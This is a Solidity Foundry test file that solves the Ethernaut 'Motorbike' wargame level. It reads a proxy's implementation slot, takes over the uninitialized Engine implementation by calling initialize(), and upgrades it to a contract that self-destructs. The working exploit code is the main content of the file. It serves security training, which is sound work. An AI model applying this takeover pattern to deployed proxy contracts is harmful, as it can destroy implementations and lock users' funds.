// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Motorbike/Motorbike.sol";
import "../Motorbike/MotorbikeAttack.sol";
import "../Motorbike/MotorbikeFactory.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(0x1234123412341234123412341234123412341234);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        MotorbikeFactory motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value : 0.001 ether}(motorbikeFactory);
        Motorbike motorbike = Motorbike(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address _engine = address(uint160(uint256(vm.load(address(motorbike), _IMPLEMENTATION_SLOT))));
        emit log_named_address("Motorbike engine implementation", _engine);

        // Set ourself as an upgrader
        Engine engine = Engine(_engine);
        engine.initialize();
        emit log_named_address("Engine upgrader", engine.upgrader());

        // Set new implementation with a selfDesctuct method
        MotorbikeAttack motorbikeAttack = new MotorbikeAttack();

        // BOOM!
        engine.upgradeToAndCall(address(motorbikeAttack), abi.encodeWithSignature("destruct()"));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        // Because of the way foundry test work it is very hard to verify this test was successful
        // Selfdestruct is a substate (see pg 8 https://ethereum.github.io/yellowpaper/paper.pdf)
        // This means it gets executed at the end of a transaction, a single test is a single transaction
        // This means we can call selfdestruct on the engine contract at the start of the test but we will
        // continue to be allowed to call all other contract function for the duration of that transaction (test)
        // since the selfdestruct execution only happy at the end 

        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        // vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}
